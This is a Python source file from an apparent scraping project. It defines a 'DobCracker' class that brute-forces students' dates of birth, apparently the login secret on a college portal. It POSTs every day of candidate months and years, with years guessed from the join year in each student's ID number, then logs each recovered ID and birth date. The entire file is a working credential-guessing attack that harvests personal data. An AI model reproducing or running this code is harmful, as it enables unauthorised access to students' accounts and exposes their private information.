from typing import Union
from abc import ABCMeta, abstractmethod

from RITScraping.scraper import Scraper, AsyncCache, gen_dob, validate_usn


class DobCracker(Scraper, metaclass=ABCMeta):
    URL: str

    @staticmethod
    @abstractmethod
    def gen_payload(usn: str, dob: str) -> dict[str, str]:
        raise NotImplementedError

    @staticmethod
    @abstractmethod
    def body_validator(soup):
        raise NotImplementedError

    async def brute_month(self, usn: str, year: int, month: int) -> Union[int, None]:
        assert validate_usn(usn)
        assert 1 <= month <= 12
        worker = self.get_soups(
            self.URL, method="POST", payload=[self.gen_payload(usn, gen_dob(day, month, year)) for day in range(1, 32)]
        )
        result = tuple(map(self.body_validator, await worker))
        return result.index(True) + 1 if True in result else None

    @AsyncCache("siscacheri956kh45")
    async def brute_year(self, *, usn: str, year: int) -> Union[str, None]:
        assert validate_usn(usn)
        for month in range(1, 13):
            if day := await self.brute_month(usn=usn, year=year, month=month): return gen_dob(day, month, year)

    async def brute_dob(self, usn) -> Union[str, None]:
        assert validate_usn(usn)
        join_year = int("20" + usn[3:5])
        for year in [y := join_year - 18, y - 1, y + 1, y - 2, y - 3]:
            if dob := await self.brute_year(usn=usn, year=year):
                print(f"{usn=}, {dob=}")
                return dob
